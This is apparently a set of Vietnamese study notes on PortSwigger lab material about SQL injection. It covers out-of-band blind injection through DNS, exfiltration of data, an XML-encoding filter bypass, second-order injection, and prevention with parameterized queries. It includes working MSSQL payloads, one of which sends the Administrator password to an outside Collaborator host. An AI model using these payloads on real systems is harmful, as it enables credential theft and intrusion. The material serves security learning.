[**Lab: Blind SQL injection with time delays and information retrieval** (1)](https://www.notion.so/Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval-1-3754b66543f98001a89cd59dc6b836a9?pvs=21)

**Khai thác blind SQL injection bằng kỹ thuật out-of-band (OAST)**

Một ứng dụng có thể thực hiện cùng truy vấn SQL như ví dụ trước nhưng theo cách bất đồng bộ. Ứng dụng tiếp tục xử lý request của người dùng trong luồng chính, và sử dụng một luồng khác để thực thi truy vấn SQL sử dụng cookie theo dõi. Truy vấn này vẫn tồn tại lỗ hổng SQL injection, nhưng không có kỹ thuật nào đã mô tả trước đó hoạt động. Phản hồi của ứng dụng không phụ thuộc vào việc truy vấn có trả về dữ liệu hay không, có xảy ra lỗi cơ sở dữ liệu hay không, hoặc thời gian thực thi truy vấn.

Trong tình huống này, thường có thể khai thác lỗ hổng blind SQL injection bằng cách kích hoạt các tương tác mạng out-of-band đến một hệ thống mà bạn kiểm soát. Những tương tác này có thể được kích hoạt dựa trên điều kiện được chèn để suy ra thông tin từng phần một. Hữu ích hơn, dữ liệu có thể được gửi ra ngoài trực tiếp thông qua tương tác mạng.

Có nhiều giao thức mạng có thể được sử dụng cho mục đích này, nhưng phổ biến và hiệu quả nhất là DNS (domain name service). Nhiều mạng trong môi trường thực tế cho phép các truy vấn DNS đi ra ngoài tự do, vì chúng cần thiết cho hoạt động bình thường của hệ thống.

**Khai thác blind SQL injection bằng kỹ thuật out-of-band (OAST) - Tiếp tục**

Công cụ dễ nhất và đáng tin cậy nhất để sử dụng các kỹ thuật out-of-band là Burp Collaborator. Đây là một server cung cấp các triển khai tùy chỉnh của nhiều dịch vụ mạng khác nhau, bao gồm DNS. Nó cho phép bạn phát hiện khi các tương tác mạng xảy ra do việc gửi các payload riêng lẻ đến ứng dụng có lỗ hổng. Burp Suite Professional có sẵn một client tích hợp được cấu hình sẵn để làm việc với Burp Collaborator. Để biết thêm thông tin, hãy xem tài liệu về Burp Collaborator.

Các kỹ thuật để kích hoạt truy vấn DNS phụ thuộc vào loại cơ sở dữ liệu đang được sử dụng. Ví dụ, input sau trên Microsoft SQL Server có thể được dùng để tạo một truy vấn DNS đến một domain được chỉ định:

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Điều này khiến cơ sở dữ liệu thực hiện truy vấn đến domain sau:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

Bạn có thể sử dụng Burp Collaborator để tạo một subdomain duy nhất và kiểm tra (poll) server Collaborator để xác nhận khi có bất kỳ truy vấn DNS nào xảy ra.

[**Lab: Blind SQL injection with out-of-band interaction** (1)](https://www.notion.so/Lab-Blind-SQL-injection-with-out-of-band-interaction-1-3754b66543f98082b01bf5c44264a2e7?pvs=21)

**Khai thác blind SQL injection bằng kỹ thuật out-of-band (OAST) - Tiếp tục**

Sau khi đã xác nhận được cách kích hoạt các tương tác out-of-band, bạn có thể sử dụng kênh này để trích xuất dữ liệu từ ứng dụng có lỗ hổng. Ví dụ:

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Input này đọc mật khẩu của người dùng `Administrator`, nối thêm một subdomain duy nhất của Collaborator, và kích hoạt một truy vấn DNS. Truy vấn này cho phép bạn xem được mật khẩu đã bị thu thập:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Các kỹ thuật out-of-band (OAST) là một phương pháp mạnh để phát hiện và khai thác blind SQL injection, nhờ tỷ lệ thành công cao và khả năng trích xuất dữ liệu trực tiếp thông qua kênh out-of-band. Vì lý do này, OAST thường được ưu tiên sử dụng ngay cả khi các kỹ thuật khai thác blind khác vẫn hoạt động.

**Lưu ý:**

Có nhiều cách khác nhau để kích hoạt các tương tác out-of-band, và mỗi kỹ thuật sẽ phù hợp với từng loại cơ sở dữ liệu khác nhau. Để biết thêm chi tiết, hãy xem tài liệu “SQL injection cheat sheet”.

[**Lab: Blind SQL injection with out-of-band data exfiltration** (1)](https://www.notion.so/Lab-Blind-SQL-injection-with-out-of-band-data-exfiltration-1-3754b66543f98088acdfce991e317234?pvs=21)

**SQL injection trong các ngữ cảnh khác nhau**

Trong các lab trước, bạn đã sử dụng query string để chèn payload SQL độc hại. Tuy nhiên, bạn có thể thực hiện tấn công SQL injection bằng bất kỳ input nào có thể kiểm soát mà được ứng dụng xử lý như một truy vấn SQL. Ví dụ, một số website nhận input ở dạng JSON hoặc XML và sử dụng chúng để truy vấn cơ sở dữ liệu.

Các định dạng khác nhau này có thể cung cấp những cách khác nhau để làm rối (obfuscate) payload, giúp vượt qua các cơ chế bảo vệ như WAF. Các hệ thống bảo vệ yếu thường tìm kiếm các từ khóa SQL injection phổ biến trong request, vì vậy bạn có thể vượt qua các bộ lọc này bằng cách mã hóa hoặc escape các ký tự trong từ khóa bị cấm. Ví dụ, đoạn SQL injection dựa trên XML sau sử dụng chuỗi escape XML để mã hóa ký tự **S** trong từ khóa SELECT:

```
<stockCheck>
<productId>123</productId>
<storeId>999&#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

Đoạn này sẽ được giải mã ở phía server trước khi được chuyển đến bộ xử lý SQL.

[**Lab: SQL injection with filter bypass via XML encoding** (1)](https://www.notion.so/Lab-SQL-injection-with-filter-bypass-via-XML-encoding-1-3754b66543f980ecbd6fc90bde015769?pvs=21)

**SQL injection bậc hai (Second-order SQL injection)**

SQL injection bậc một xảy ra khi ứng dụng xử lý input từ HTTP request và chèn trực tiếp input đó vào truy vấn SQL một cách không an toàn.

SQL injection bậc hai xảy ra khi ứng dụng nhận input từ HTTP request và lưu trữ nó để sử dụng sau này. Việc này thường được thực hiện bằng cách lưu input vào cơ sở dữ liệu, và tại thời điểm lưu trữ thì không có lỗ hổng xảy ra. Sau đó, khi xử lý một HTTP request khác, ứng dụng lấy dữ liệu đã lưu và chèn vào truy vấn SQL một cách không an toàn. Vì lý do này, SQL injection bậc hai còn được gọi là stored SQL injection.

SQL injection bậc hai

SQL injection bậc hai thường xảy ra trong các trường hợp mà lập trình viên đã nhận thức được lỗ hổng SQL injection, nên xử lý an toàn khi lưu input vào cơ sở dữ liệu. Khi dữ liệu được sử dụng lại, nó được xem là an toàn vì đã được lưu trữ một cách “an toàn” trước đó. Tuy nhiên, tại thời điểm này, dữ liệu lại được xử lý không an toàn, do lập trình viên nhầm tưởng rằng dữ liệu đó là đáng tin cậy.

**Cách phòng chống SQL injection**

Bạn có thể ngăn chặn hầu hết các trường hợp SQL injection bằng cách sử dụng các truy vấn có tham số (parameterized queries) thay vì nối chuỗi trực tiếp trong truy vấn. Các truy vấn này còn được gọi là “prepared statements”.

Đoạn code sau dễ bị SQL injection vì input của người dùng được nối trực tiếp vào truy vấn:

```
Stringquery="SELECT * FROM products WHERE category = '"+input+"'";
Statementstatement=connection.createStatement();
ResultSetresultSet=statement.executeQuery(query);
```

Bạn có thể viết lại đoạn code này theo cách ngăn input của người dùng can thiệp vào cấu trúc truy vấn:

```
PreparedStatementstatement=connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1,input);
ResultSetresultSet=statement.executeQuery();
```

**Cách phòng chống SQL injection - Tiếp tục**

Bạn có thể sử dụng các truy vấn có tham số (parameterized queries) trong mọi trường hợp mà input không đáng tin xuất hiện dưới dạng dữ liệu trong truy vấn, bao gồm mệnh đề WHERE và các giá trị trong câu lệnh INSERT hoặc UPDATE. Tuy nhiên, chúng không thể được sử dụng để xử lý input không đáng tin ở các phần khác của truy vấn, như tên bảng, tên cột, hoặc mệnh đề ORDER BY. Đối với các chức năng đặt dữ liệu không đáng tin vào những phần này của truy vấn, cần áp dụng các cách tiếp cận khác, chẳng hạn như:

- Sử dụng danh sách trắng (whitelisting) các giá trị input hợp lệ.
- Sử dụng logic khác để đạt được hành vi mong muốn.

Để truy vấn có tham số thực sự hiệu quả trong việc ngăn chặn SQL injection, chuỗi truy vấn phải luôn là một hằng số được hard-code. Nó không được chứa bất kỳ dữ liệu biến nào từ bất kỳ nguồn nào. Không nên quyết định theo từng trường hợp rằng dữ liệu nào là đáng tin và tiếp tục sử dụng nối chuỗi trong các trường hợp được cho là an toàn. Rất dễ mắc sai lầm về nguồn gốc của dữ liệu, hoặc những thay đổi ở phần code khác có thể khiến dữ liệu “đáng tin” trở nên không an toàn.

[**Lab: SQL injection attack, listing the database contents on Oracle** (1)](https://www.notion.so/Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle-1-3754b66543f9808486acddf625bbe712?pvs=21)

[**Lab: Blind SQL injection with time delays** (1)](https://www.notion.so/Lab-Blind-SQL-injection-with-time-delays-1-3754b66543f980698ab7d82925a2df0d?pvs=21)

[**Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped** (1)](https://www.notion.so/Lab-Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-3754b66543f980188de8d6d398fda31c?pvs=21)

[**Lab: SQL injection attack, querying the database type and version on Oracle** (1)](https://www.notion.so/Lab-SQL-injection-attack-querying-the-database-type-and-version-on-Oracle-1-3754b66543f980d1a719f817b29b0975?pvs=21)
